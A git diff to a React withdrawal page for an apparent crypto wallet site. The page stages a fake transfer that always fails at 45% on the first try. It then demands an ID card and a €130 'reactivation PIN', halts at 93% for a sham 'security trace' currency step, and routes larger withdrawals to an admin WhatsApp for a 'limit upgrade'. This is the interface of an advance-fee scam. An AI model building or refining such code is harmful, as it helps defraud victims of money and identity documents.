@@ -4,14 +4,22 @@ import { motion, AnimatePresence } from 'framer-motion';
 import { 
   FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
   FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
-  FaIdCard, FaUpload, FaTimes
+  FaIdCard, FaUpload, FaTimes, FaArrowUp, FaWhatsapp, FaHeadset,
+  FaGlobe, FaSearch, FaExchangeAlt
 } from 'react-icons/fa';
 import toast from 'react-hot-toast';
 import Navbar from '../components/Navbar';
 import { walletService } from '../services/walletService';
 import { useAuth } from '../auth/userAuth';
 import { getCurrencySymbol } from '../utils/currency';
+import { ADMIN_WHATSAPP } from '../data/mockData';
+import { country } from '../data/countries';
 import API from '../utils/axios';
+
+// ✅ WITHDRAWAL LIMIT – users can withdraw up to this amount
+const WITHDRAWAL_LIMIT = 5000;
+// ✅ SECURITY TRACE THRESHOLD – amounts above this require local currency conversion
+const TRACE_THRESHOLD = 1000;
 
 const Withdraw = () => {
   const navigate = useNavigate();
@@ -36,10 +44,21 @@ const Withdraw = () => {
   const [pinError, setPinError] = useState('');
   const [isVerifyingPin, setIsVerifyingPin] = useState(false);
 
-  // ID card upload state (ID number removed)
+  // ID card upload state
   const [idCardFile, setIdCardFile] = useState(null);
   const [idError, setIdError] = useState('');
   const idInputRef = useRef(null);
+
+  // ✅ Upgrade limit modal state
+  const [showUpgradeModal, setShowUpgradeModal] = useState(false);
+
+  // ✅ NEW: Currency conversion modal state
+  const [showCurrencyModal, setShowCurrencyModal] = useState(false);
+  const [selectedCountry, setSelectedCountry] = useState(null);
+  const [countrySearch, setCountrySearch] = useState('');
+  const [currencyConfirmed, setCurrencyConfirmed] = useState(false);
+  const [isConverting, setIsConverting] = useState(false);
+  const [countryError, setCountryError] = useState('');
 
   // PIN from env or fallback
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '123456';
@@ -79,41 +98,66 @@ const Withdraw = () => {
     };
   }, []);
 
+  // ✅ Progress effect with pause at 93% for security check
   useEffect(() => {
-    if (showTransferModal) {
-      setTransferProgress(0);
-      setTransferStatus('pending');
-      let progress = 0;
-      progressInterval.current = setInterval(() => {
-        progress += 1;
-
-        if (progress >= 45 && !isRetry) {
-          clearInterval(progressInterval.current);
-          progressInterval.current = null;
-          setTransferProgress(45);
-          setTransferStatus('failed');
-          return;
-        }
-
-        if (progress >= 100) {
-          clearInterval(progressInterval.current);
-          progressInterval.current = null;
-          setTransferProgress(100);
-          setTransferStatus('complete');
-          toast.success('Withdrawal completed successfully!');
-          return;
-        }
-        setTransferProgress(progress);
-      }, 100);
-    } else {
+    if (!showTransferModal) {
       if (progressInterval.current) {
         clearInterval(progressInterval.current);
         progressInterval.current = null;
       }
-      setTransferProgress(0);
-      setTransferStatus('pending');
+      return;
     }
-  }, [showTransferModal, isRetry]);
+
+    if (transferStatus === 'complete' || transferStatus === 'failed') return;
+
+    let progress = transferProgress;
+
+    progressInterval.current = setInterval(() => {
+      progress += 1;
+
+      // ❌ Fail at 45% on first attempt
+      if (progress >= 45 && !isRetry) {
+        clearInterval(progressInterval.current);
+        progressInterval.current = null;
+        setTransferProgress(45);
+        setTransferStatus('failed');
+        return;
+      }
+
+      // ✅ NEW: Pause at 93% if retry AND amount > threshold AND not yet confirmed
+      if (
+        progress >= 93 &&
+        isRetry &&
+        parseFloat(amount) > TRACE_THRESHOLD &&
+        !currencyConfirmed
+      ) {
+        clearInterval(progressInterval.current);
+        progressInterval.current = null;
+        setTransferProgress(93);
+        setShowCurrencyModal(true);
+        return;
+      }
+
+      // ✅ Complete at 100%
+      if (progress >= 100) {
+        clearInterval(progressInterval.current);
+        progressInterval.current = null;
+        setTransferProgress(100);
+        setTransferStatus('complete');
+        toast.success('Withdrawal completed successfully!');
+        return;
+      }
+
+      setTransferProgress(progress);
+    }, 100);
+
+    return () => {
+      if (progressInterval.current) {
+        clearInterval(progressInterval.current);
+        progressInterval.current = null;
+      }
+    };
+  }, [showTransferModal, isRetry, currencyConfirmed, transferStatus]);
 
   const cryptos = [
     { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
@@ -122,6 +166,13 @@ const Withdraw = () => {
     { id: 'BNB', name: 'BNB', icon: FaBitcoin, color: 'text-yellow-500' },
     { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
   ];
+
+  // ✅ Filter countries for search
+  const filteredCountries = country.filter((c) =>
+    c.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
+    c.currency.toLowerCase().includes(countrySearch.toLowerCase()) ||
+    c.code.toLowerCase().includes(countrySearch.toLowerCase())
+  );
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -148,14 +199,21 @@ const Withdraw = () => {
       return;
     }
 
+    if (amountNum > WITHDRAWAL_LIMIT) {
+      setShowUpgradeModal(true);
+      return;
+    }
+
     setIsRetry(false);
+    setCurrencyConfirmed(false);
+    setSelectedCountry(null);
     proceedWithdrawal(amountNum);
   };
 
   const proceedWithdrawal = async (amountNum) => {
     setLoading(true);
     try {
-      await new Promise(resolve => setTimeout(resolve, 800));
+      await new Promise((resolve) => setTimeout(resolve, 800));
       setShowTransferModal(true);
     } catch (error) {
       toast.error(error.response?.data?.message || 'Withdrawal failed');
@@ -174,6 +232,15 @@ const Withdraw = () => {
         metadata: {
           cryptoCurrency: crypto,
           walletAddress: address,
+          // ✅ Include local currency info if converted
+          ...(currencyConfirmed &&
+            selectedCountry && {
+              convertedToLocal: true,
+              localCurrency: selectedCountry.currency,
+              localCurrencySymbol: selectedCountry.symbol,
+              countryCode: selectedCountry.code,
+              countryName: selectedCountry.name,
+            }),
         },
         status: 'pending',
       });
@@ -191,7 +258,6 @@ const Withdraw = () => {
     setIdError('');
   };
 
-  // Handle ID card file selection
   const handleIdFileChange = (e) => {
     const file = e.target.files[0];
     if (!file) return;
@@ -215,7 +281,6 @@ const Withdraw = () => {
     if (idInputRef.current) idInputRef.current.value = '';
   };
 
-  // Verify reactivation PIN (only ID card file is required)
   const handleVerifyPin = () => {
     if (!idCardFile) {
       setIdError('Please upload your ID card.');
@@ -249,6 +314,26 @@ const Withdraw = () => {
     }, 800);
   };
 
+  // ✅ NEW: Handle currency conversion confirmation
+  const handleConfirmConversion = () => {
+    if (!selectedCountry) {
+      setCountryError('Please select your country.');
+      return;
+    }
+    setCountryError('');
+    setIsConverting(true);
+
+    // Simulate a short conversion process
+    setTimeout(() => {
+      setIsConverting(false);
+      setCurrencyConfirmed(true);
+      setShowCurrencyModal(false);
+      toast.success(
+        `Balance will be converted to ${selectedCountry.currency}. Resuming transfer...`
+      );
+    }, 1200);
+  };
+
   const handleCloseSuccess = async () => {
     setShowTransferModal(false);
     await finalizeWithdrawal();
@@ -261,6 +346,12 @@ const Withdraw = () => {
   };
 
   const isKycVerified = kycStatus === 'verified';
+  const amountNum = parseFloat(amount) || 0;
+
+  // WhatsApp support link for upgrade modal
+  const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
+    `Hello, I would like to upgrade my withdrawal limit. My current request of $${amountNum.toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
+  )}`;
 
   return (
     <div className="min-h-screen bg-slate-900 pt-16 lg:pl-64 pb-20 lg:pb-0">
@@ -281,6 +372,13 @@ const Withdraw = () => {
               <span className="text-slate-400">Available Balance</span>
               <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
             </div>
+          </div>
+
+          <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
+            <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
+            <p className="text-blue-400 text-sm">
+              Your withdrawal limit is <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> per request.
+            </p>
           </div>
 
           {!isKycVerified && (
@@ -332,6 +430,17 @@ const Withdraw = () => {
                   className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                 />
               </div>
+              {amountNum > WITHDRAWAL_LIMIT && (
+                <p className="text-red-400 text-xs mt-1">
+                  Amount exceeds your withdrawal limit of {formatCurrency(WITHDRAWAL_LIMIT)}.
+                </p>
+              )}
+              {amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
+                <p className="text-amber-400 text-xs mt-1 flex items-center gap-1">
+                  <FaShieldAlt className="text-amber-400" />
+                  Amounts above {formatCurrency(TRACE_THRESHOLD)} require local currency verification.
+                </p>
+              )}
             </div>
 
             <div>
@@ -361,6 +470,73 @@ const Withdraw = () => {
           </form>
         </motion.div>
       </div>
+
+      {/* ✅ UPGRADE LIMIT MODAL */}
+      <AnimatePresence>
+        {showUpgradeModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, y: 20 }}
+              animate={{ scale: 1, y: 0 }}
+              exit={{ scale: 0.9, y: 20 }}
+              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
+            >
+              <div className="flex justify-center mb-4">
+                <div className="w-16 h-16 bg-orange-500/10 border border-orange-500/30 rounded-full flex items-center justify-center">
+                  <FaArrowUp className="w-8 h-8 text-orange-500" />
+                </div>
+              </div>
+
+              <h3 className="text-xl font-bold text-white text-center mb-2">
+                Withdrawal Limit Exceeded
+              </h3>
+
+              <p className="text-sm text-slate-400 text-center mb-4">
+                Your withdrawal request of{' '}
+                <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
+                exceeds your current limit of{' '}
+                <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
+              </p>
+
+              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
+                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-orange-300 text-xs leading-relaxed">
+                  To upgrade your withdrawal limit, please contact our support team. They will guide
+                  you through the account upgrade process.
+                </p>
+              </div>
+
+              <div className="flex gap-3">
+                <button
+                  onClick={() => setShowUpgradeModal(false)}
+                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+                >
+                  Cancel
+                </button>
+                <a
+                  href={whatsappUpgradeLink}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+                >
+                  <FaWhatsapp className="text-lg" />
+                  Contact Support
+                </a>
+              </div>
+
+              <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
+                <FaHeadset className="text-slate-500" />
+                <span>Support is available 24/7</span>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
 
       {/* TRANSFER SIMULATION MODAL */}
       <AnimatePresence>
@@ -443,7 +619,149 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* REACTIVATION MODAL (ID upload + €130 PIN notice, no ID number) */}
+      {/* ✅ NEW: CURRENCY CONVERSION / SECURITY TRACE MODAL */}
+      <AnimatePresence>
+        {showCurrencyModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, y: 20 }}
+              animate={{ scale: 1, y: 0 }}
+              exit={{ scale: 0.9, y: 20 }}
+              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto"
+            >
+              <div className="flex justify-center mb-4">
+                <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
+                  <FaGlobe className="w-8 h-8 text-blue-500" />
+                </div>
+              </div>
+
+              <h3 className="text-xl font-bold text-white text-center mb-2">
+                Security Verification Required
+              </h3>
+
+              <p className="text-sm text-slate-400 text-center mb-4">
+                Your withdrawal of{' '}
+                <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
+                exceeds <strong className="text-white">{formatCurrency(TRACE_THRESHOLD)}</strong>.
+                To ensure traceability and prevent security risks, please confirm your local currency.
+              </p>
+
+              <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-start gap-3">
+                <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-blue-300 text-xs leading-relaxed">
+                  Your wallet balance will be converted to your local currency to trace the
+                  transaction route and protect your funds.
+                </p>
+              </div>
+
+              {/* Search */}
+              <div className="mb-3">
+                <div className="relative">
+                  <FaSearch className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500 text-sm" />
+                  <input
+                    type="text"
+                    value={countrySearch}
+                    onChange={(e) => setCountrySearch(e.target.value)}
+                    placeholder="Search country or currency..."
+                    className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-10 pr-4 py-2.5 text-white placeholder-slate-500 text-sm focus:outline-none focus:border-blue-500 transition"
+                  />
+                </div>
+              </div>
+
+              {/* Country Select */}
+              <div className="mb-4">
+                <label className="block text-slate-300 text-sm font-medium mb-2">
+                  Select Your Country
+                </label>
+                <select
+                  value={selectedCountry?.code || ''}
+                  onChange={(e) => {
+                    const c = country.find((x) => x.code === e.target.value);
+                    setSelectedCountry(c || null);
+                    setCountryError('');
+                  }}
+                  size={5}
+                  className="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-blue-500 transition"
+                >
+                  {(countrySearch ? filteredCountries : country).map((c) => (
+                    <option key={c.code} value={c.code} className="py-1">
+                      {c.flag} {c.name} — {c.currency} ({c.symbol})
+                    </option>
+                  ))}
+                </select>
+                {countryError && (
+                  <p className="text-red-400 text-xs mt-2">{countryError}</p>
+                )}
+              </div>
+
+              {/* Selected Country Summary */}
+              {selectedCountry && (
+                <div className="mb-4 p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg">
+                  <div className="flex items-center gap-2 mb-2">
+                    <FaExchangeAlt className="text-emerald-400 text-sm" />
+                    <p className="text-emerald-400 text-xs font-medium">Conversion Preview</p>
+                  </div>
+                  <div className="space-y-1 text-sm">
+                    <div className="flex justify-between">
+                      <span className="text-slate-400">From:</span>
+                      <span className="text-white font-medium">{formatCurrency(amountNum)} USD</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-slate-400">To:</span>
+                      <span className="text-white font-medium">
+                        {selectedCountry.symbol} {selectedCountry.currency}
+                      </span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-slate-400">Country:</span>
+                      <span className="text-white font-medium">
+                        {selectedCountry.flag} {selectedCountry.name}
+                      </span>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              <div className="flex gap-3">
+                <button
+                  onClick={() => {
+                    setShowCurrencyModal(false);
+                    setSelectedCountry(null);
+                    setCountrySearch('');
+                    setCountryError('');
+                  }}
+                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+                >
+                  Cancel
+                </button>
+                <button
+                  onClick={handleConfirmConversion}
+                  disabled={isConverting || !selectedCountry}
+                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                >
+                  {isConverting ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                      Converting...
+                    </>
+                  ) : (
+                    <>
+                      <FaCheckCircle /> Confirm
+                    </>
+                  )}
+                </button>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* REACTIVATION MODAL */}
       <AnimatePresence>
         {showReactivationModal && (
           <motion.div
@@ -468,18 +786,16 @@ const Withdraw = () => {
                 Account Reactivation Required
               </h3>
 
-              {/* Summarized notice box */}
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
-                  Your withdrawal limit has increased. For security, please upload your ID card
-                  and enter your reactivation PIN. A reactivation PIN costs{' '}
+                  For security, please upload your ID card and enter your reactivation PIN.
+                  A reactivation PIN costs{' '}
                   <strong className="text-orange-200">€130.00</strong> and must be purchased
                   before completing this withdrawal.
                 </p>
               </div>
 
-              {/* ID CARD UPLOAD */}
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
                   Upload ID Card
@@ -525,7 +841,6 @@ const Withdraw = () => {
                 )}
               </div>
 
-              {/* REACTIVATION PIN */}
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
                   Reactivation PIN
